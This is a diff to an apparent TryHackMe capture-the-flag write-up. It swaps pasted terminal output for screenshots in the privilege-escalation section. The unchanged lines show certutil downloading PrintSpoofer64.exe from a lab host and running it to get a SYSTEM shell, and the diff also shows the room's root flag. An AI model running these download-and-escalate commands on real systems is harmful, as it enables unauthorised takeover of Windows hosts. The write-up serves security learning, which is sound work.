@@ -226,30 +226,16 @@ certutil -urlcache -split -f http://192.168.144.226/PrintSpoofer64.exe PS64.exe
 > PS64.exe -i -c cmd
 ```
 
-```text
-PS64.exe -i -c cmd
-[+] Found privilege: SeImpersonatePrivilege
-[+] Named pipe listening...
-[+] CreateProcessAsUser() OK
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>
-```
-
-```powershell
-> whoami
-```
-
-```text
-nt authority\system
-```
+<img width="604" height="262" alt="whoami" src="https://github.com/user-attachments/assets/a6c0010c-09b9-4763-b8eb-c3023faa8994" />
 
 ```powershell
 C:\Users\Administrator\Desktop>type root.txt
 ```
 
 Root Flag:  
+
+<img width="515" height="100" alt="rootfl" src="https://github.com/user-attachments/assets/2cf3f7b8-281e-41fe-8ec9-7f65be3e1e80" />
+
 ```text
 THM{1fk5kf469devly1gl320zafgl345pv}
 ```
